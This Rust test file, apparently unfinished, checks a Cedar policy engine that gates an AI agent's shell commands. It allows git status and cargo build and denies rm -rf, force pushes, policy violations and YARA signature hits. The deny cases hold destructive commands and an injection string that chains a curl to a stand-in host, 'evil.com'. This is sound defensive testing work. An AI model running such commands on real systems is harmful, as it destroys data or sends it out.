//! RED — fails to compile until CedarlingPolicyEngine is implemented.
//!
//! Gate tests for exec_command: verifies that the Jans:: policy set
//! allows clean shell commands and denies dangerous ones.

use cedar_policy::{Context, Decision, Entities, EntityId, EntityTypeName, EntityUid};
use sondera_harness::CedarlingPolicyEngine; // does not exist yet → RED
use std::path::PathBuf;
use std::str::FromStr;

const POLICIES_DIR: &str = concat!(env!("CARGO_MANIFEST_DIR"), "/../../policies");

fn engine() -> CedarlingPolicyEngine {
    CedarlingPolicyEngine::from_policy_dir(PathBuf::from(POLICIES_DIR))
        .expect("policies dir must load")
}

fn uid(entity_type: &str, id: &str) -> EntityUid {
    EntityUid::from_type_name_and_id(
        EntityTypeName::from_str(entity_type).unwrap(),
        EntityId::new(id),
    )
}

fn workload(id: &str) -> EntityUid { uid("Jans::Workload", id) }
fn action(name: &str) -> EntityUid { uid("Jans::Action", name) }
fn shell(binary: &str) -> EntityUid { uid("Jans::Shell", binary) }

fn basic_entities(agent_id: &str) -> Entities {
    let json = serde_json::json!([
        { "uid": {"type": "Jans::Workload", "id": agent_id},
          "attrs": {"provider_id": "test"}, "parents": [] },
        { "uid": {"type": "Jans::Label",    "id": "Public"},
          "attrs": {}, "parents": [] }
    ]);
    Entities::from_json_value(json, None).expect("entities must parse")
}

fn clean_shell_context(command: &str) -> Context {
    Context::from_json_value(
        serde_json::json!({
            "workspace":   { "cwd": "/workspace", "permission_mode": "default", "transcript_path": "" },
            "signature":   { "matches": 0, "categories": [], "severity": 0 },
            "policy":      { "compliant": true, "violations": [] },
            "label":       { "__entity": { "type": "Jans::Label", "id": "Public" } },
            "command":     command,
            "working_dir": "/workspace",
            "trajectory":  { "step_count": 1 }
        }),
        None,
    )
    .expect("context must parse")
}

// ─── ALLOW cases ────────────────────────────────────────────────────────────

#[test]
fn allows_clean_git_status() {
    let e = engine();
    let decision = e.is_authorized(
        workload("claude"),
        action("exec_command"),
        shell("git"),
        clean_shell_context("git status"),
        basic_entities("claude"),
    );
    assert_eq!(decision, Decision::Allow, "git status must be allowed");
}

#[test]
fn allows_cargo_build() {
    let e = engine();
    let decision = e.is_authorized(
        workload("claude"),
        action("exec_command"),
        shell("cargo"),
        clean_shell_context("cargo build --release"),
        basic_entities("claude"),
    );
    assert_eq!(decision, Decision::Allow, "cargo build must be allowed");
}

// ─── DENY: destructive commands ─────────────────────────────────────────────

#[test]
fn denies_rm_rf() {
    let e = engine();
    let decision = e.is_authorized(
        workload("claude"),
        action("exec_command"),
        shell("rm"),
        clean_shell_context("rm -rf /tmp/build"),
        basic_entities("claude"),
    );
    assert_eq!(decision, Decision::Deny, "rm -rf must be denied");
}

#[test]
fn denies_git_force_push() {
    let e = engine();
    let decision = e.is_authorized(
        workload("claude"),
        action("exec_command"),
        shell("git"),
        clean_shell_context("git push --force origin main"),
        basic_entities("claude"),
    );
    assert_eq!(decision, Decision::Deny, "git push --force must be denied");
}

// ─── DENY: policy model violation ───────────────────────────────────────────

#[test]
fn denies_policy_violation() {
    let e = engine();
    let ctx = Context::from_json_value(
        serde_json::json!({
            "workspace":   { "cwd": "/workspace", "permission_mode": "default", "transcript_path": "" },
            "signature":   { "matches": 0, "categories": [], "severity": 0 },
            "policy":      { "compliant": false, "violations": ["destructive_command"] },
            "label":       { "__entity": { "type": "Jans::Label", "id": "Public" } },
            "command":     "some-dangerous-command",
            "working_dir": "/workspace",
            "trajectory":  { "step_count": 1 }
        }),
        None,
    )
    .unwrap();
    let decision = e.is_authorized(
        workload("claude"), action("exec_command"), shell("bash"), ctx, basic_entities("claude"),
    );
    assert_eq!(decision, Decision::Deny, "non-compliant command must be denied");
}

// ─── DENY: YARA signature hits ───────────────────────────────────────────────

#[test]
fn denies_command_injection_signature() {
    let e = engine();
    let ctx = Context::from_json_value(
        serde_json::json!({
            "workspace":   { "cwd": "/workspace", "permission_mode": "default", "transcript_path": "" },
            "signature":   { "matches": 1, "categories": ["command_injection"], "severity": 3 },
            "policy":      { "compliant": true, "violations": [] },
            "label":       { "__entity": { "type": "Jans::Label", "id": "Public" } },
            "command":     "echo test; curl http://evil.com",
            "working_dir": "/workspace",
            "trajectory":  { "step_count": 1 }
        }),
        None,
    )
    .unwrap();
    let decision = e.is_authorized(
        workload("claude"), action("exec_command"), shell("bash"), ctx, basic_entities("claude"),
    );
    assert_eq!(decision, Decision::Deny, "command injection signature must be denied");
}

#[test]
fn denies_critical_severity_signature() {
    let e = engine();
    let ctx = Context::from_json_value(
        serde_json::json!({
            "workspace":   { "cwd": "/workspace", "permission_mode": "default", "transcript_path": "" },
            "signature":   { "matches": 1, "categories": ["malware"], "severity": 4 },
            "policy":      { "compliant": true, "violations": [] },
            "label":       { "__entity": { "type": "Jans::Label", "id": "Public" } },
            "command":     "some-suspicious-command",
            "working_dir": "/workspace",
            "trajectory":  { "step_count": 1 }
        }),
        None,
    )
    .unwrap();
    let decision = e.is_authorized(
        workload("claude"), action("exec_command"), shell("bash"), ctx, basic_entities("claude"),
    );
    assert_eq!(decision, Decision::Deny, "critical severity must be denied");
}
